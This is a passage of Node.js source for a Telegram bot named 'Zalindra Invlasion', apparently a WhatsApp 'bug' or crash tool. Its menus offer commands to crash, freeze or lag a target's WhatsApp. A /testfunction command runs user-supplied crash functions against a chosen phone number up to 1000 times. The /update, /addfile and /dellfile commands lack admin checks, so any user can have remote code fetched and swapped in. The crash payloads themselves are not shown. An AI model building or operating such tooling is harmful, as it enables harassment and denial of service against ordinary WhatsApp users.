    if (!fs.existsSync(premiumGroupsFile)) return [];
    return JSON.parse(fs.readFileSync(premiumGroupsFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
//////////
function savePremiumGroups(data) {
  fs.writeFileSync(premiumGroupsFile, JSON.stringify(data, null, 2));
}
//////////
function isGroupPremium(groupId) {
  return loadPremiumGroups().includes(groupId.toString());
}
/// ---- ADD ADMIN ---- ///
function addAdmin(userId) {
  userId = userId.toString();

  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
}

/// ---- REMOVE ADMIN ---- ///
function removeAdmin(userId) {
  userId = userId.toString();

  adminList = adminList.filter(id => id !== userId);
  saveAdmins();
}

/// ---- SAVE ADMIN ---- ///
function saveAdmins() {
  try {
    fs.writeFileSync("./database/admins.json", JSON.stringify(adminList, null, 2));
  } catch (err) {
    console.log("❌ Gagal save admin:", err.message);
  }
}

/// ---- LOAD ADMIN ---- ///
function loadAdmins() {
  try {
    if (!fs.existsSync("./database/admins.json")) {
      adminList = [];
      return;
    }

    const data = fs.readFileSync("./database/admins.json", "utf8");

   
    adminList = JSON.parse(data || "[]").map(id => id.toString());

  } catch (err) {
    console.log("⚠️ Gagal load admin:", err.message);
    adminList = [];
  }
}
/// ---- SLEEP ---- ///
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/// ---- CHECK PREMIUM ---- ///
function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}

/// ---- CHECK OWNER ---- ///
function isOwner(id) {
  return ownerUsers.includes(id.toString());
}

/// ---- LOAD OWNER ---- ///
function loadOwner() {
  try {
    if (!fs.existsSync(ownerFile)) return [];
    return JSON.parse(fs.readFileSync(ownerFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
/// ------ Check Sender ------- \\\
function isSender(userId) {
  return senderUsers.includes(String(userId));
}
// -------- Anti foto ---------- ///
function loadAntiFoto() {
  try {
    if (!fs.existsSync(antiFotoFile)) return []
    return JSON.parse(fs.readFileSync(antiFotoFile))
  } catch {
    return []
  }
}


function saveAntiFoto(data) {
  fs.writeFileSync(antiFotoFile, JSON.stringify(data, null, 2))
}

let antiFotoGroups = loadAntiFoto()

/// ------- ANTI VIDIO ------- ///
function loadAntiVideo() {
  try {
    if (!fs.existsSync(antiVideoFile)) return []
    return JSON.parse(fs.readFileSync(antiVideoFile))
  } catch {
    return []
  }
}

function saveAntiVideo(data) {
  fs.writeFileSync(antiVideoFile, JSON.stringify(data, null, 2))
}

let antiVideoGroups = loadAntiVideo()
/// JAM ///
function getTimeIndonesia() {
  const now = new Date();

  const wib = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
  const wita = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Makassar" }));
  const wit = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jayapura" }));

  return `
🕒 LIVE JAM INDONESIA

🇮🇩 WIB  : ${wib.toLocaleTimeString("id-ID", { hour12: false })}
🇮🇩 WITA : ${wita.toLocaleTimeString("id-ID", { hour12: false })}
🇮🇩 WIT  : ${wit.toLocaleTimeString("id-ID", { hour12: false })}
`;
}
/// cmd of/on ///
function loadCmdMode() {
  try {
    if (!fs.existsSync(CMD_FILE)) {
      fs.writeFileSync(CMD_FILE, JSON.stringify({ disabled: [] }, null, 2));
    }

    const data = JSON.parse(fs.readFileSync(CMD_FILE));

    return {
      disabled: Array.isArray(data.disabled) ? data.disabled : []
    };

  } catch (e) {
    return { disabled: [] };
  }
}

function saveCmdMode(data) {
  fs.writeFileSync(CMD_FILE, JSON.stringify(data, null, 2));
}
/// midlaware Cmd on / of ///
bot.use((ctx, next) => {
  const data = loadCmdMode();

  const text = ctx.message?.text || ctx.callbackQuery?.data || "";

  if (!text.startsWith("/")) return next(); 

  const cmd = text
    .split(" ")[0]
    .replace(/^\/+/, "")
    .replace(/@.+$/, "")
    .toLowerCase()
    .trim();

  const userId = ctx.from?.id?.toString();

  const isAdminUser =
    adminList.includes(userId) || ownerUsers.includes(userId);

  const disabled = Array.isArray(data?.disabled) ? data.disabled : [];

  // console.log("CMD:", cmd);
// console.log("DISABLED:", disabled);

  if (disabled.includes(cmd)) {
    if (isAdminUser) return next();
    return ctx.reply("⛔ Command ini sedang dinonaktifkan admin");
  }

  return next();
});
/// ---- GROUP ONLY ---- ///
bot.use((ctx, next) => {
  const groupMode = getGroupMode();

  if (groupMode === "on" && ctx.chat.type === "private") {
    return ctx.reply(`
🔒 𝐆𝐑𝐎𝐔𝐏 𝐎𝐍𝐋𝐘 𝐌𝐎𝐃𝐄

Bot ini hanya bisa digunakan di dalam group.
Silakan gunakan perintah di group.
`);
  }

  return next();
});
/// ---- SELF / PUBLIC MODE ---- ///
bot.use((ctx, next) => {
  const mode = getMode();

  if (mode === "self" && !isOwner(ctx.from.id)) {

    if (ctx.callbackQuery) {
      return ctx.answerCbQuery("🔒 BOT DI KUNCI OWNER", { show_alert: true });
    }

    return; 
  }

  return next();
});
// ===== Tracker ===== // ontol
const commandList = new Set();

const originalCommand = bot.command.bind(bot);

bot.command = (cmd, ...args) => {
  commandList.add(cmd);
  return originalCommand(cmd, ...args);
};
/// -------- ( menu utama ) --------- \\\
const imagePath = "./image/AtomicCrashers.jpg";
const audioPath = "./image/AtomicSound.mp3";

if (!fs.existsSync(imagePath)) {
  throw new Error("❌ File gambar tidak ditemukan: " + imagePath);
}

if (!fs.existsSync(audioPath)) {
  throw new Error("❌ File audio tidak ditemukan: " + audioPath);
}

const getImage = () => ({
  source: fs.createReadStream(imagePath)
});

bot.start(async (ctx) => {
  const userId = ctx.from.id;
  
  const menuMessage = `
<blockquote>[ 💫 ] ⵢ Zalindra Invlasion</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalindra Invlasion</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>17.0 beta</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>-# Zalindra is - Death 𖣂</blockquote>`;

  const keyboard = [
    [{ text: "Trash - £ore ϟ", callback_data: "/bug" }],
    [
      { text: "Controls - £ore ϟ", callback_data: "/controls" },
      { text: "Thanks - £ore ϟ", callback_data: "/tqto" },
    ],
    [{ text: "Developer !", url: "https://t.me/seanoffc" }],
  ];

  await ctx.replyWithPhoto(getImage(), {
    caption: menuMessage,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: keyboard },
  });

  await ctx.replyWithAudio(
    { source: fs.createReadStream(audioPath) },
    {
      title: "sygg aku hamil",
      caption: "Kan Kita Cmn Teman",
      performer: "Strict Parents",
    }
  );
});

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function safeEdit(ctx, type, content, keyboard) {
  const userId = ctx.from.id;

  
  const verified = true;
  if (!verified) return;

  if (isCooldown && typeof isCooldown === 'function' && isCooldown(userId)) {
    return ctx.answerCbQuery("Tunggu sebentar...");
  }

  try {
    if (type === "media") {
      await delay(700);

      await ctx.editMessageMedia(
        {
          type: "photo",
          media: getImage(),
          caption: content,
          parse_mode: "HTML",
        },
        { reply_markup: { inline_keyboard: keyboard } }
      );
    }

    if (type === "caption") {
      await delay(700);

      await ctx.editMessageCaption(content, {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: keyboard },
      });
    }

    await ctx.answerCbQuery();

  } catch (error) {
    if (error.response && error.response.error_code === 429) {
      const retryAfter = (error.response.parameters?.retry_after || 3) * 1000;
      console.log(`Rate Limited. Retry after ${retryAfter}ms`);
      await ctx.answerCbQuery("Server sibuk, tunggu...");
      await delay(retryAfter);
      return;
    }

    if (error.response && error.response.error_code === 400 && 
        error.response.description.includes("message is not modified")) {
      return ctx.answerCbQuery();
    }

    console.error("Edit Error:", error.response?.description || error.message);
    try { await ctx.answerCbQuery("Error"); } catch {}
  }
}

bot.action(['/start', '/back'], async (ctx) => {
  const menuMessage = `
<blockquote>[ <tg-emoji emoji-id="5267149567404560363">⚡</tg-emoji> ] ⵢ Zalindra Invlasion</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalindra Invlasion</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>17 beta/b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>-# Zalindra Is Death 𖣂</blockquote>`;

  const keyboard = [
    [{ text: "Trash - £ore ϟ", callback_data: "/bug", style: "success", icon_custom_emoji_id: "5265192393757443515" }],
    [
      { text: "Controls - £ore ϟ", callback_data: "/controls", style: "success", icon_custom_emoji_id: "5267052410949354660" },
      { text: "Thanks - £ore ϟ", callback_data: "/tqto", style: "danger", icon_custom_emoji_id: "5265185624888984668" }
    ],
    [{ text: "Developer !", url: "https://t.me/seanoffc", style: "danger", icon_custom_emoji_id: "5787156307496669392" }]
  ];

  await safeEdit(ctx, "media", menuMessage, keyboard);
});

bot.action('/controls', async (ctx) => {
  const controlsMenu = `
<blockquote>[ <tg-emoji emoji-id="5266984906948362314">🚀</tg-emoji> ] ⵢ Zalindra Invlasion</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalindra Invlas</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>17 beta</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>Ϟ °Controls</blockquote>
𖥂 /killsesi - <b>delete sessions</b>
𖥂 /connect - <b>add sender number</b>
𖥂 /addadmin - <b>add admin users</b>
𖥂 /deladmin - <b>dell admin users</b>
𖥂 /addprem - <b>add premium users</b>
𖥂 /delprem - <b>dell premium users</b>
𖥂 /cekprem - <b>cek premium users</b>
𖥂 /cekid - <b>cek format users</b>
𖥂 /groupon - <b>group only</b>
𖥂 /groupoff - <b>group off</b>
𖥂 /addgroupremium - <b>add gb premium</b>
𖥂 /delgrouppremium - <b>dell gb premium</b>
`;

  const keyboard = [[
    { text: "ⵢ Back", callback_data: "/back", style: "primary", icon_custom_emoji_id: "5787546290527145353" },
    { text: "Next ⵢ", callback_data: "/controls2", style: "primary", icon_custom_emoji_id: "5787429669280157600" }
  ]];

  await safeEdit(ctx, "caption", controlsMenu, keyboard);
});

bot.action('/controls2', async (ctx) => {
  const controlsMenu2 = `
<blockquote>[ <tg-emoji emoji-id="4958808208752772190">💎</tg-emoji> ] ⵢ Zalindra is - Death</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalindra Invlasion</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>17 beta</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>Ϟ °Controls</blockquote>
𖥂 /cmdaktif - <b>mengaktifkan cmd yang terkunci</b>
𖥂 /nonaktifcmd - <b>menonaktifkan cmd</b>
𖥂 /listcmd - <b>list cmd mati and hidup</b>
𖥂 /runtime - <b>bot runtime</b>
𖥂 /self - <b>bot di kunci kecuali owner</b>
𖥂 /public - <b>bot di buka untuk umum</b>
𖥂 /antifoto - <b>anti foto di group</b>
𖥂 /antivideo - <b>anti video di group</b>
𖥂 /restart - <b>restart panel otomatis</b>
𖥂 /update - <b>update script otomatis</b>
𖥂 /testfunction - <b>test function</b>

`;

  const keyboard = [[
    { text: "ⵢ Back", callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5787546290527145353" },
    { text: "Next ⵢ", callback_data: "/back", style: "primary", icon_custom_emoji_id: "5787429669280157600" }
  ]];

  await safeEdit(ctx, "caption", controlsMenu2, keyboard);
});

bot.action('/bug', async (ctx) => {
  const bugMenu = `
<blockquote>[ <tg-emoji emoji-id="5265192393757443515">💀</tg-emoji> ] ⵢ Zalindra is - Death</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalindra Invlasion</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>17 beta</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>°Not Spam(visible)</blockquote>
𖥂 /xlock - <b>Blank Click</b>
𖥂 /ints - <b>Frezee Infinity</b>
𖥂 /xzwj - <b>Delay hard</b>
𖥂 /xloca - <b>Crash no click</b>
𖥂 /xrax - <b>Freze X delay</b>
`;

  const keyboard = [[
    { text: "ⵢ Back", callback_data: "/back", style: "primary", icon_custom_emoji_id: "5787546290527145353" },
    { text: "Next ⵢ", callback_data: "/bug2", style: "primary", icon_custom_emoji_id: "5787429669280157600" }
  ]];

  await safeEdit(ctx, "caption", bugMenu, keyboard);
});

bot.action('/bug2', async (ctx) => {
  const bugMenu2 = `
<blockquote>[ <tg-emoji emoji-id="5265192393757443515">📩</tg-emoji> ] ⵢ Zalindra is - Death</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalindra Invlas</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>17 beta</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>°Bebas Spam (invis)</blockquote>
𖥂 /locksc - <b>delay duration</b>
𖥂 /xkona - <b>delay stat</b>
`;

  const keyboard = [[
    { text: "ⵢ Back", callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5787546290527145353" },
    { text: "Next ⵢ", callback_data: "/back", style: "primary", icon_custom_emoji_id: "5787429669280157600" }
  ]];

  await safeEdit(ctx, "caption", bugMenu2, keyboard);
});

bot.action('/tqto', async (ctx) => {
  const tqtoMenu = `
<blockquote>[ <tg-emoji emoji-id="4956214478002717877">⚖️</tg-emoji> ] ⵢ Zalindra is - Death</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalindra Invlas</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>17 beta</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>° Ϟ °ThaksToo</blockquote>
𖥂 @seanoffc - <b>Creator</b>
𖥂 @Ambakikuk - <b>Best Support</b>
𖥂 @Xatanicvxii - <b>Best Support</b>
𖥂 @kafk6 - <b>Best Support</b>
𖥂 @Xatansi - <b>My Secc</b>
`;

  const keyboard = [[
    { text: "Back ⵢ", callback_data: "/back", style: "primary", icon_custom_emoji_id: "5787546290527145353" }
  ]];

  await safeEdit(ctx, "caption", tqtoMenu, keyboard);
});

/// ------ ( Plugins ) ------- \\\
function getUserId(ctx) {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return null;

  return args[1].replace(/[^0-9]/g, ""); 
}

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

bot.command("testfunction", checkWhatsAppConnection, checkAdmin, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ")
    if (args.length < 3)
      return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 ( reply function )")

    const q = args[1]
    const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
    if (isNaN(jumlah) || jumlah <= 0)
      return ctx.reply("❌ ☇ Jumlah harus angka")

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
      return ctx.reply("❌ ☇ Reply dengan function")

    const processMsg = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: `
<blockquote><pre>📋 𝐙𝐀𝐋𝐈𝐍𝐃𝐑𝐀 ─────═⬡
👉  Target: ${q}
👉  Type: Unknown Function
👉  Status: Proses
</pre></blockquote>
`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ CEK TARGET", url: `https://wa.me/${q}` }]
          ]
        }
      }
    )
    const processMessageId = processMsg.message_id

    const safeSock = createSafeSock(sock)
    const funcCode = ctx.message.reply_to_message.text
    const match = funcCode.match(/async function\s+(\w+)/)
    if (!match) return ctx.reply("❌ ☇ Function tidak valid")
    const funcName = match[1]

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      generateWAMessageFromContent,
      generateForwardMessageContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser
    }
    const context = vm.createContext(sandbox)

    const wrapper = `${funcCode}\n${funcName}`
    const fn = vm.runInContext(wrapper, context)
    console.log("start")
    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length
        if (arity === 1) {
          await fn(target)
        } else if (arity === 2) {
          await fn(safeSock, target)
        } else {
          await fn(safeSock, target, true)
        }
      } catch (err) {}
      await sleep(200)
    }
    console.log("done testfunction")
    const finalText = `
<blockquote><pre>📋 ZALINDRA ─────═⬡
👉  Target: ${q}
👉  Type: Unknown Function
👉  Status: Success
</pre></blockquote>
`
    try {
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        processMessageId,
        undefined,
        finalText,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ ☇ CEK TARGET", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
    } catch (e) {
      await ctx.replyWithPhoto(
        { url: thumbnailUrl },
        {
          caption: finalText,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ ☇ CEK TARGET", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
    }
  } catch (err) {}
});


/// CASE BUAT OWNER MENU ///
bot.command("cekprem", async (ctx) => {
  try {
    let target = ctx.from;

  
    if (ctx.message.reply_to_message) {
      target = ctx.message.reply_to_message.from;
    }

    const userId = target.id.toString();
    const firstName = target.first_name || "-";
    const lastName = target.last_name || "";
    const fullName = `${firstName} ${lastName}`.trim();
    const username = target.username ? `@${target.username}` : "Tidak ada username";

   
    const isUserPremium = premiumUsers.includes(userId);
    const isUserAdmin = adminList.includes(userId);
    const isUserOwner = ownerUsers.includes(userId);

    let status = "Non Premium ❌";

    if (isUserOwner) {
      status = "Owner 👑";
    } else if (isUserAdmin) {
      status = "Admin ⚡";
    } else if (isUserPremium) {
      status = "Premium 💎";
    }

  
    let groupStatus = "Private Chat";
    if (ctx.chat.type !== "private") {
      groupStatus = isGroupPremium(ctx.chat.id)
        ? "Group Premium ✅"
        : "Group Non Premium ❌";
    }

    const teks = `
<blockquote><strong>「 CEK STATUS USER 」</strong></blockquote>
👤 Nama: ${fullName}
🆔 ID: <code>${userId}</code>
🔗 Username: ${username}
💎 Status: ${status}
🏷️ Group: ${groupStatus}
💬 Chat ID: <code>${ctx.chat.id}</code>
`;

    await ctx.reply(teks, {
      parse_mode: "HTML"
    });

  } catch (e) {
    console.error("CEKPREM ERROR:", e);

    await ctx.reply(
      `❌ Error saat cek premium\n${e.message}`
    );
  }
});

bot.command("listcmd", checkAdmin, async (ctx) => {
  const data = loadCmdMode();
  const disabled = Array.isArray(data?.disabled) ? data.disabled : [];

  const allCommands = [...commandList];

  const active = allCommands.filter(c => !disabled.includes(c));

  const activeList = active.length
    ? active.map(c => `➤ /${c}`).join("\n")
    : "Tidak ada";

  const disabledList = disabled.length
    ? disabled.map(c => `➤ /${c}`).join("\n")
    : "Tidak ada";

  return ctx.replyWithPhoto(
    { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
    {
      caption:
`<pre>📊 SYSTEM COMMAND

┌─ ✅ CMD AKTIF
${activeList}

└─ ⛔ CMD NONAKTIF
${disabledList}</pre>`,
      parse_mode: "HTML"
    }
  );
});

bot.command("addgroupremium", checkOwner, async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini sudah PREMIUM");
    }

  
    premiumGroups.push(groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dijadikan PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

const fsp = fs.promises;
// ================== LOAD CONFIG FROM update.js (NO CACHE) ==================
function loadUpdateConfig() {
  try {
    // pastikan ambil dari root project (process.cwd()), bukan lokasi file lain
    const cfgPath = path.join(process.cwd(), "update.js");

    // hapus cache require biar selalu baca update.js terbaru setelah restart/update
    try {
      delete require.cache[require.resolve(cfgPath)];
    } catch (_) {}

    const cfg = require(cfgPath);
    return (cfg && typeof cfg === "object") ? cfg : {};
  } catch (e) {
    return {};
  }
}

const UPD = loadUpdateConfig();

// ====== CONFIG ======
const GITHUB_OWNER = UPD.github_owner || "name gh";
const DEFAULT_REPO = UPD.github_repo_default || "name repo";
const GITHUB_BRANCH = UPD.github_branch || "main";
const UPDATE_FILE_IN_REPO = UPD.update_file_in_repo || "index.js";

// token untuk WRITE (add/del)
const GITHUB_TOKEN_WRITE = UPD.github_token_write || "";

// target lokal yang bakal diganti oleh /update
const LOCAL_TARGET_FILE = path.join(process.cwd(), "index.js");

// ================== FETCH HELPER ==================
const fetchFn = global.fetch || ((...args) => import("node-fetch").then(({ default: f }) => f(...args)));

// ================== FILE WRITE ATOMIC ==================
async function atomicWriteFile(targetPath, content) {
  const dir = path.dirname(targetPath);
  const tmp = path.join(dir, `.update_tmp_${Date.now()}_${path.basename(targetPath)}`);
  await fsp.writeFile(tmp, content, { encoding: "utf8" });
  await fsp.rename(tmp, targetPath);
}

// ================== READ (PUBLIC): DOWNLOAD RAW ==================
async function ghDownloadRawPublic(repo, filePath) {
  const rawUrl =
    `https://raw.githubusercontent.com/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/${encodeURIComponent(GITHUB_BRANCH)}/${filePath}`;

  const res = await fetchFn(rawUrl, { headers: { "User-Agent": "telegraf-update-bot" } });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`Gagal download ${filePath} (${res.status}): ${txt || res.statusText}`);
  }
  return await res.text();
}

// ================== WRITE (BUTUH TOKEN): GITHUB API ==================
function mustWriteToken() {
  if (!GITHUB_TOKEN_WRITE) {
    throw new Error("Token WRITE kosong. Isi github_token_write di update.js (Contents: Read and write).");
  }
}

function ghWriteHeaders() {
  mustWriteToken();
  return {
    Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
    Accept: "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "telegraf-gh-writer",
  };
}

async function ghGetContentWrite(repo, filePath) {
  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}?ref=${encodeURIComponent(GITHUB_BRANCH)}`;

  const res = await fetchFn(url, { headers: ghWriteHeaders() });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub GET ${res.status}: ${txt || res.statusText}`);
  }
  return res.json();
}

async function ghPutFileWrite(repo, filePath, contentText, commitMsg) {
  let sha;
  try {
    const existing = await ghGetContentWrite(repo, filePath);
    sha = existing?.sha;
  } catch (e) {
    if (!String(e.message).includes(" 404")) throw e; // 404 => create baru
  }

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = {
    message: commitMsg,
    content: Buffer.from(contentText, "utf8").toString("base64"),
    branch: GITHUB_BRANCH,
    ...(sha ? { sha } : {}),
  };

  const res = await fetchFn(url, {
    method: "PUT",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub PUT ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

async function ghDeleteFileWrite(repo, filePath, commitMsg) {
  const info = await ghGetContentWrite(repo, filePath);
  const sha = info?.sha;
  if (!sha) throw new Error("SHA tidak ketemu. Pastikan itu file (bukan folder).");

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = { message: commitMsg, sha, branch: GITHUB_BRANCH };

  const res = await fetchFn(url, {
    method: "DELETE",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub DELETE ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

// ================== COMMANDS ==================

// /update [repoOptional]
// download update_index.js -> replace local index.js -> restart
bot.command("update", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    await ctx.reply("🔄 Bot akan update otomatis.\n♻️ Tunggu proses 1–3 menit...");
    await ctx.reply(`⬇️ Mengambil update dari GitHub: *${repo}/${UPDATE_FILE_IN_REPO}* ...`, { parse_mode: "Markdown" });

    const newCode = await ghDownloadRawPublic(repo, UPDATE_FILE_IN_REPO);

    if (!newCode || newCode.trim().length < 50) {
      throw new Error("File update terlalu kecil/kosong. Pastikan update_index.js bener isinya.");
    }

    // backup index.js lama
    try {
      const backup = path.join(process.cwd(), "index.backup.js");
      await fsp.copyFile(LOCAL_TARGET_FILE, backup);
    } catch (_) {}

    await atomicWriteFile(LOCAL_TARGET_FILE, newCode);

    await ctx.reply("✅ Update berhasil diterapkan.\n♻️ Restarting panel...");

    setTimeout(() => process.exit(0), 3000);
  } catch (err) {
    await ctx.reply(`❌ Update gagal: ${err.message || String(err)}`);
  }
});

// /addfiles <repo> (reply file .js)
bot.command("addfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    const replied = ctx.message.reply_to_message;
    const doc = replied?.document;

    if (!doc) {
      return ctx.reply("❌ Reply file .js dulu, lalu ketik:\n/addfiles <namerepo>\nContoh: /addfiles Pullupdate");
    }

    const fileName = doc.file_name || "file.js";
    if (!fileName.endsWith(".js")) return ctx.reply("❌ File harus .js");

    await ctx.reply(`⬆️ Uploading *${fileName}* ke repo *${repo}*...`, { parse_mode: "Markdown" });

    const link = await ctx.telegram.getFileLink(doc.file_id);
    const res = await fetchFn(link.href);
    if (!res.ok) throw new Error(`Gagal download file telegram: ${res.status}`);

    const contentText = await res.text();

    await ghPutFileWrite(repo, fileName, contentText, `Add/Update ${fileName} via bot`);

    await ctx.reply(`✅ Berhasil upload *${fileName}* ke repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});

// /delfiles <repo> <path/file.js>
bot.command("dellfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;
    const file = parts[2];

    if (!file) {
      return ctx.reply("Format:\n/delfiles <namerepo> <namefiles>\nContoh: /delfiles Pullupdate index.js");
    }

    await ctx.reply(`🗑️ Menghapus *${file}* di repo *${repo}*...`, { parse_mode: "Markdown" });

    await ghDeleteFileWrite(repo, file, `Delete ${file} via bot`);

    await ctx.reply(`✅ Berhasil hapus *${file}* di repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});
  
// ====== /restart ======
bot.command("restart", async (ctx) => {
  await ctx.reply("♻️ Panel akan *restart manual* untuk menjaga kestabilan...");

  // kirim status ke grup utama kalau ada
  try {
    if (typeof sendToGroupsUtama === "function") {
      sendToGroupsUtama(
        "🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...",
        { parse_mode: "Markdown" }
      );
    }
  } catch (e) {}

  setTimeout(() => {
    try {
      if (typeof sendToGroupsUtama === "function") {
        sendToGroupsUtama(
          "🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!",
          { parse_mode: "Markdown" }
        );
      }
    } catch (e) {}
  }, 8000);

  setTimeout(() => process.exit(0), 5000);
});



bot.command("delgrouppremium", checkOwner, async (ctx) => {
  try {
    
